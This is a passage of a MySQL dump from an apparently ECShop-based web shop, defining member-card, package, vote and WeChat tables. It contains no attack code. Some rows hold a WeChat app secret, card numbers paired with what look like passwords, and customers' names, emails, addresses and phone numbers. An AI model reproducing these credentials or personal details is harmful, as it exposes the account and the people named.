INSERT INTO `ec22703249_user_card` VALUES ('1934', '0', '1', '', '00934', '40025588', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1935', '0', '1', '', '00935', '17491006', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1936', '0', '1', '', '00936', '57723452', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1937', '0', '1', '', '00937', '53176231', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1938', '0', '1', '', '00938', '36854579', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1939', '0', '1', '', '00939', '26221496', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1940', '0', '1', '', '00940', '84203464', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1941', '0', '1', '', '00941', '28584847', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1942', '0', '1', '', '00942', '50631678', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1943', '0', '1', '', '00943', '79245328', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1944', '0', '1', '', '00944', '49492664', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1945', '0', '1', '', '00945', '69771844', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1946', '0', '1', '', '00946', '77316470', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1947', '0', '1', '', '00947', '48002195', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1948', '0', '1', '', '00948', '59742541', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1949', '0', '1', '', '00949', '73320577', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1950', '0', '1', '', '00950', '51907541', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1951', '0', '1', '', '00951', '55917230', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1952', '0', '1', '', '00952', '52413937', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1953', '0', '1', '', '00953', '47640176', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1954', '0', '1', '', '00954', '88920904', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1955', '0', '1', '', '00955', '98231724', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1956', '0', '1', '', '00956', '36291677', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1957', '0', '1', '', '00957', '97724463', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1958', '0', '1', '', '00958', '49305916', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1959', '0', '1', '', '00959', '70033151', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1960', '0', '1', '', '00960', '28197174', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1961', '0', '1', '', '00961', '73050712', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1962', '0', '1', '', '00962', '63101045', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1963', '0', '1', '', '00963', '64360556', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1964', '0', '1', '', '00964', '85807034', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1965', '0', '1', '', '00965', '40619022', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1966', '0', '1', '', '00966', '31139355', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1967', '0', '1', '', '00967', '76626520', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1968', '0', '1', '', '00968', '64211549', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1969', '0', '1', '', '00969', '17990920', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1970', '0', '1', '', '00970', '25645363', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1971', '0', '1', '', '00971', '52495427', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1972', '0', '1', '', '00972', '53307061', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1973', '0', '1', '', '00973', '31535429', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1974', '0', '1', '', '00974', '27427113', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1975', '0', '1', '', '00975', '31878007', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1976', '0', '1', '', '00976', '25370785', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1977', '0', '1', '', '00977', '73480207', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1978', '0', '1', '', '00978', '76244306', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1979', '0', '1', '', '00979', '29972756', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1980', '0', '1', '', '00980', '91392972', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1981', '0', '1', '', '00981', '92287704', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1982', '0', '1', '', '00982', '76360948', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1983', '0', '1', '', '00983', '15059938', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1984', '0', '1', '', '00984', '24540038', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1985', '0', '1', '', '00985', '92683398', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1986', '17', '1', '', '00986', '68000548', '1', '', '1345454357', '1408331941', '0.00', '0', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1987', '0', '1', '', '00987', '53674574', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1988', '0', '1', '', '00988', '49781038', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1989', '0', '1', '', '00989', '54288721', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1990', '0', '1', '', '00990', '15620001', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1991', '17', '1', '', '00991', '26872432', '1', '', '1345454357', '1408331232', '0.00', '0', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1992', '17', '1', '', '00992', '58289119', '1', '', '1345454357', '1408331174', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1993', '17', '1', '', '00993', '45219537', '1', '', '1345454357', '1408330709', '0.00', '0', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1994', '0', '1', '', '00994', '70773980', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1995', '0', '1', '', '00995', '66631749', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1996', '0', '1', '', '00996', '71744630', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1997', '0', '1', '', '00997', '74534075', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1998', '0', '1', '', '00998', '14930492', '0', '', '1345454357', '0', '100.00', '1000', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('1999', '1', '1', '', '00999', '58747259', '1', '', '1345454357', '1405534117', '0.00', '0', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('2000', '2', '1', '', '01000', '661020', '1', '', '1345454357', '1404932118', '0.00', '0', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('2001', '0', '5', '', '22201', '91667832', '0', '', '1407810144', '0', '0.00', '0', '0', '', '', '', '', '', '1', '');
INSERT INTO `ec22703249_user_card` VALUES ('2002', '17', '3', '', '888888', '888888', '1', '', '1407978563', '1407978659', '0.00', '0', '0', '', '', '', '', '', '1', '');

-- ----------------------------
-- Table structure for `ec22703249_user_card_type`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_user_card_type`;
CREATE TABLE `ec22703249_user_card_type` (
  `ct_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `ct_name` varchar(60) NOT NULL DEFAULT '',
  `des` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`ct_id`),
  UNIQUE KEY `ct_name` (`ct_name`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_user_card_type
-- ----------------------------
INSERT INTO `ec22703249_user_card_type` VALUES ('1', '会员卡', '');
INSERT INTO `ec22703249_user_card_type` VALUES ('3', '测试', '');
INSERT INTO `ec22703249_user_card_type` VALUES ('4', '卡1', '');
INSERT INTO `ec22703249_user_card_type` VALUES ('5', '1', '');

-- ----------------------------
-- Table structure for `ec22703249_user_feed`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_user_feed`;
CREATE TABLE `ec22703249_user_feed` (
  `feed_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `value_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `feed_type` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `is_feed` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`feed_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_user_feed
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_user_rank`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_user_rank`;
CREATE TABLE `ec22703249_user_rank` (
  `rank_id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `rank_name` varchar(30) NOT NULL DEFAULT '',
  `min_points` int(10) unsigned NOT NULL DEFAULT '0',
  `max_points` int(10) unsigned NOT NULL DEFAULT '0',
  `discount` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `show_price` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `special_rank` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`rank_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_user_rank
-- ----------------------------
INSERT INTO `ec22703249_user_rank` VALUES ('1', '注册用户', '0', '10000', '100', '1', '0');

-- ----------------------------
-- Table structure for `ec22703249_user_taocan`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_user_taocan`;
CREATE TABLE `ec22703249_user_taocan` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `tname` varchar(255) DEFAULT NULL COMMENT '套餐名',
  `tprice` decimal(10,2) DEFAULT '0.00' COMMENT '套餐价格',
  `tpic` varchar(255) DEFAULT NULL COMMENT '套餐图片',
  `last_date` varchar(255) DEFAULT NULL COMMENT '最后修改时间',
  `descs` text COMMENT '描述',
  `beizhu` varchar(255) DEFAULT NULL COMMENT '套餐备注',
  `status` varchar(1) DEFAULT NULL COMMENT '1:已激活 2:未激活',
  `user_id` varchar(255) DEFAULT NULL COMMENT '用户ID',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_user_taocan
-- ----------------------------
INSERT INTO `ec22703249_user_taocan` VALUES ('1', '测试套餐AAA1', '309.00', 'images/201408/1408161732322436193.jpg', '1408294556', '这是描述额的', '', '1', '17');
INSERT INTO `ec22703249_user_taocan` VALUES ('2', 'hello 套餐测试', '100.00', 'images/201408/1408086592235181418.jpg', '1408086592', 'werewrwer', '用户合同期限到期', '2', '17');

-- ----------------------------
-- Table structure for `ec22703249_user_tc_goods`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_user_tc_goods`;
CREATE TABLE `ec22703249_user_tc_goods` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `tcid` int(10) DEFAULT NULL COMMENT '套餐ID',
  `gids` varchar(255) DEFAULT NULL COMMENT '商品ID',
  `weekdays` varchar(255) DEFAULT NULL COMMENT '周几',
  `halfday` varchar(255) DEFAULT NULL COMMENT '上午 或者下午',
  `consignee` varchar(60) NOT NULL DEFAULT '',
  `email` varchar(60) NOT NULL DEFAULT '',
  `country` smallint(5) NOT NULL DEFAULT '0',
  `province` smallint(5) NOT NULL DEFAULT '0',
  `city` smallint(5) NOT NULL DEFAULT '0',
  `district` smallint(5) NOT NULL DEFAULT '0',
  `address` varchar(120) NOT NULL DEFAULT '',
  `zipcode` varchar(60) NOT NULL DEFAULT '',
  `mobile` varchar(60) NOT NULL DEFAULT '',
  `weeks` int(10) DEFAULT '0' COMMENT '一年中第多少周',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_user_tc_goods
-- ----------------------------
INSERT INTO `ec22703249_user_tc_goods` VALUES ('33', '2', 'a:2:{i:0;s:1:\"1\";i:1;s:1:\"2\";}', '周二', '上午', '李大钊', 'bcfauvey@gmail.com', '1', '6', '79', '717', '12313', '234234', '13222323232', '0');
INSERT INTO `ec22703249_user_tc_goods` VALUES ('34', '2', 'a:2:{i:0;s:1:\"3\";i:1;s:1:\"4\";}', '周三', '下午', '李大嘴', 'roeddy1981@googlemail.com', '1', '2', '52', '507', 'Moskauer Strasse 73 99091 Erfurt germany', '99091', '491735613125', '0');
INSERT INTO `ec22703249_user_tc_goods` VALUES ('35', '1', 'a:1:{i:0;s:1:\"1\";}', '周三', '上午', '李大成', '324234@qq.com', '1', '3', '37', '410', 'CVMNMM,1', '2001123', '13685634251', '0');
INSERT INTO `ec22703249_user_tc_goods` VALUES ('36', '1', 'a:2:{i:0;s:1:\"3\";i:1;s:1:\"4\";}', '周四', '下午', '李大钊', '324234@qq.com', '1', '2', '52', '500', 'CVMNMM,1', '2001123', '13685634255', '0');

-- ----------------------------
-- Table structure for `ec22703249_virtual_card`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_virtual_card`;
CREATE TABLE `ec22703249_virtual_card` (
  `card_id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `goods_id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `card_sn` varchar(60) NOT NULL DEFAULT '',
  `card_password` varchar(60) NOT NULL DEFAULT '',
  `add_date` int(11) NOT NULL DEFAULT '0',
  `end_date` int(11) NOT NULL DEFAULT '0',
  `is_saled` tinyint(1) NOT NULL DEFAULT '0',
  `order_sn` varchar(20) NOT NULL DEFAULT '',
  `crc32` varchar(12) NOT NULL DEFAULT '0',
  PRIMARY KEY (`card_id`),
  KEY `goods_id` (`goods_id`),
  KEY `car_sn` (`card_sn`),
  KEY `is_saled` (`is_saled`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_virtual_card
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_volume_price`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_volume_price`;
CREATE TABLE `ec22703249_volume_price` (
  `price_type` tinyint(1) unsigned NOT NULL,
  `goods_id` mediumint(8) unsigned NOT NULL,
  `volume_number` smallint(5) unsigned NOT NULL DEFAULT '0',
  `volume_price` decimal(10,2) NOT NULL DEFAULT '0.00',
  PRIMARY KEY (`price_type`,`goods_id`,`volume_number`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_volume_price
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_vote`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_vote`;
CREATE TABLE `ec22703249_vote` (
  `vote_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `vote_name` varchar(250) NOT NULL DEFAULT '',
  `start_time` int(11) unsigned NOT NULL DEFAULT '0',
  `end_time` int(11) unsigned NOT NULL DEFAULT '0',
  `can_multi` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `vote_count` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`vote_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_vote
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_vote_log`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_vote_log`;
CREATE TABLE `ec22703249_vote_log` (
  `log_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `vote_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ip_address` varchar(15) NOT NULL DEFAULT '',
  `vote_time` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`log_id`),
  KEY `vote_id` (`vote_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_vote_log
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_vote_option`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_vote_option`;
CREATE TABLE `ec22703249_vote_option` (
  `option_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `vote_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `option_name` varchar(250) NOT NULL DEFAULT '',
  `option_count` int(8) unsigned NOT NULL DEFAULT '0',
  `option_order` tinyint(3) unsigned NOT NULL DEFAULT '100',
  PRIMARY KEY (`option_id`),
  KEY `vote_id` (`vote_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_vote_option
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_weixin_bonus`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_weixin_bonus`;
CREATE TABLE `ec22703249_weixin_bonus` (
  `id` tinyint(1) NOT NULL AUTO_INCREMENT,
  `type_id` int(5) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_weixin_bonus
-- ----------------------------
INSERT INTO `ec22703249_weixin_bonus` VALUES ('1', '1');

-- ----------------------------
-- Table structure for `ec22703249_weixin_cfg`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_weixin_cfg`;
CREATE TABLE `ec22703249_weixin_cfg` (
  `cfg_id` int(3) unsigned NOT NULL AUTO_INCREMENT,
  `cfg_name` varchar(64) NOT NULL DEFAULT '',
  `cfg_value` varchar(100) NOT NULL,
  `autoload` varchar(20) NOT NULL DEFAULT 'yes',
  PRIMARY KEY (`cfg_id`),
  UNIQUE KEY `cfg_name` (`cfg_name`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_weixin_cfg
-- ----------------------------
INSERT INTO `ec22703249_weixin_cfg` VALUES ('1', 'murl', 'mobile', 'yes');
INSERT INTO `ec22703249_weixin_cfg` VALUES ('2', 'baseurl', 'http://shop.138wo.com/', 'yes');

-- ----------------------------
-- Table structure for `ec22703249_weixin_config`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_weixin_config`;
CREATE TABLE `ec22703249_weixin_config` (
  `id` int(1) NOT NULL,
  `token` varchar(100) NOT NULL,
  `appid` char(18) NOT NULL,
  `appsecret` char(32) NOT NULL,
  `access_token` char(150) NOT NULL,
  `dateline` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_weixin_config
-- ----------------------------
INSERT INTO `ec22703249_weixin_config` VALUES ('1', 'weixin', 'wx878d7d76b140cf50', '6e066ea8e2c01b62473baabdb9a52f33', '', '1386912383');

-- ----------------------------
-- Table structure for `ec22703249_weixin_keywords`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_weixin_keywords`;
CREATE TABLE `ec22703249_weixin_keywords` (
  `id` int(4) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `keyword` varchar(100) NOT NULL,
  `type` tinyint(1) unsigned NOT NULL,
  `contents` text NOT NULL,
  `pic` varchar(80) NOT NULL,
  `pic_tit` varchar(80) NOT NULL,
  `desc` text NOT NULL,
  `pic_url` varchar(80) NOT NULL,
  `count` int(10) unsigned NOT NULL,
  `status` tinyint(1) unsigned NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=106 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_weixin_keywords
-- ----------------------------
INSERT INTO `ec22703249_weixin_keywords` VALUES ('90', '帮助', 'help', '1', '输入【help】查看帮助\r\n输入【cxbd】绑定会员\r\n输入【quit】退出绑定\r\n输入【member】会员中心\r\n输入【new】查看最新商品\r\n输入【hot】查看热卖商品\r\n输入【best】查看推荐商品\r\n输入【promote】特价促销\r\n输入【qiandao】签到送积分\r\n输入【ddcx】查询订单\r\n输入【kdcx】快递查询\r\n输入【jfcx】查询积分、余额', '', '', '', '', '99', '1');
INSERT INTO `ec22703249_weixin_keywords` VALUES ('91', '你好', '你好', '1', '输入【帮助】打开快捷菜单', '', '', '', '', '6', '1');
INSERT INTO `ec22703249_weixin_keywords` VALUES ('92', '您好', '您好', '1', '输入【帮助】打开快捷菜单', '', '', '', '', '0', '1');
INSERT INTO `ec22703249_weixin_keywords` VALUES ('100', '图文消息测试', '图文消息', '2', '', '4.jpg', '图文消息的测试标题', '资料显示，华数集团是由杭州文广集团、浙江广电集团等投资设立的大型国有文化传媒产业集团。在新媒体产业，华数集团旗下控股的上市公司华数传媒控股股份有限公司拥有上百万小时的数字媒体内容库、数千万台互联网电视终端，新媒体全业务运营牌照。', 'http://tech.sina.com.cn/i/2014-04-08/18199305530.shtml', '63', '1');
INSERT INTO `ec22703249_weixin_keywords` VALUES ('105', '文本消息测试', '文本消息', '1', '近年来，公开选拔和竞争上岗作为干部人事制度改革的重要举措，在拓宽选人视野，打破论资排辈等不少方面积极作用明显。“但走向极端就会出现问题，比如一些地方规定公开选拔和竞争上岗人员必须达到干部任用的多少比例，甚至进一步绝对化为‘凡提必竞’。”中央党校教授辛鸣说。', '', '', '', '', '54', '1');

-- ----------------------------
-- Table structure for `ec22703249_weixin_lang`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_weixin_lang`;
CREATE TABLE `ec22703249_weixin_lang` (
  `lang_id` int(4) unsigned NOT NULL AUTO_INCREMENT,
  `lang_name` varchar(64) NOT NULL,
  `lang_value` text NOT NULL,
  PRIMARY KEY (`lang_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_weixin_lang
-- ----------------------------
INSERT INTO `ec22703249_weixin_lang` VALUES ('1', 'regmsg', '欢迎关注君禾园微信公众演示平台！\r\n进入 <a href=\"http://shop.138wo.com/\">官方商城</a>\r\n输入【help】打开快捷菜单');

-- ----------------------------
-- Table structure for `ec22703249_weixin_menu`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_weixin_menu`;
CREATE TABLE `ec22703249_weixin_menu` (
  `cat_id` smallint(5) NOT NULL AUTO_INCREMENT,
  `cat_name` varchar(255) NOT NULL DEFAULT '',
  `cat_type` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `keywords` varchar(255) NOT NULL DEFAULT '',
  `weixin_key` varchar(255) NOT NULL DEFAULT '',
  `links` varchar(255) NOT NULL DEFAULT '',
  `sort_order` tinyint(3) unsigned NOT NULL DEFAULT '50',
  `weixin_type` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `parent_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`cat_id`),
  KEY `cat_type` (`cat_type`),
  KEY `sort_order` (`sort_order`),
  KEY `parent_id` (`parent_id`)
) ENGINE=MyISAM AUTO_INCREMENT=56 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_weixin_menu
-- ----------------------------
INSERT INTO `ec22703249_weixin_menu` VALUES ('43', '热卖商品', '1', '', 'hot', '', '50', '0', '38');
INSERT INTO `ec22703249_weixin_menu` VALUES ('44', '促销活动', '1', '', 'promote', '', '50', '0', '38');
INSERT INTO `ec22703249_weixin_menu` VALUES ('38', '商品信息', '1', '', 'shop', '', '1', '0', '0');
INSERT INTO `ec22703249_weixin_menu` VALUES ('39', '会员功能', '1', '', 'member', 'http://www.yunmoban.cn', '2', '0', '0');
INSERT INTO `ec22703249_weixin_menu` VALUES ('40', '更多..', '1', '', 'more', '', '3', '0', '0');
INSERT INTO `ec22703249_weixin_menu` VALUES ('41', '新品上市', '1', '', 'new', '', '50', '0', '38');
INSERT INTO `ec22703249_weixin_menu` VALUES ('42', '精品推荐', '1', '', 'best', '', '50', '0', '38');
INSERT INTO `ec22703249_weixin_menu` VALUES ('46', '重新绑定', '1', '', 'cxbd', '', '5', '0', '39');
INSERT INTO `ec22703249_weixin_menu` VALUES ('47', '会员中心', '1', '', 'member', '', '4', '0', '39');
INSERT INTO `ec22703249_weixin_menu` VALUES ('48', '帮助', '1', '帮助', 'help', '', '3', '0', '40');
INSERT INTO `ec22703249_weixin_menu` VALUES ('49', '首页', '1', '', '', 'http://shop.138wo.com/mobile', '2', '1', '40');
INSERT INTO `ec22703249_weixin_menu` VALUES ('50', '图文消息', '1', '', '图文消息', '', '4', '0', '40');
INSERT INTO `ec22703249_weixin_menu` VALUES ('51', '文本消息', '1', '', '文本消息', '', '5', '0', '40');
INSERT INTO `ec22703249_weixin_menu` VALUES ('52', '订单查询', '1', '', 'ddcx', '', '2', '0', '39');
INSERT INTO `ec22703249_weixin_menu` VALUES ('53', '快递查询', '1', '', 'kdcx', '', '3', '0', '39');
INSERT INTO `ec22703249_weixin_menu` VALUES ('54', '帐户资金', '1', '', 'jfcx', '', '1', '0', '39');
